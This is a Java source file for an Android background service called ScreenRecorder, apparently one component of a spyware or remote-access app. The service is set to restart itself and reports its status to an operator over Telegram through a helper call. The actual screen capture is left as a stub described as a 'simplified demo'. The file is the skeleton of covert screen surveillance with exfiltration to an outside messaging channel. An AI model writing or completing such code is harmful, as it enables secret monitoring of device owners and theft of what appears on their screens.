package com.mood.reaper;

import android.app.Service;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.IBinder;

public class ScreenRecorder extends Service {
    private MediaRecorder recorder;
    private VirtualDisplay display;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        // Butuh intent dari MediaProjection (via Activity), simplified demo
        Utils.sendToTelegram("🖥️ Screen recorder ready (requires permission)");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}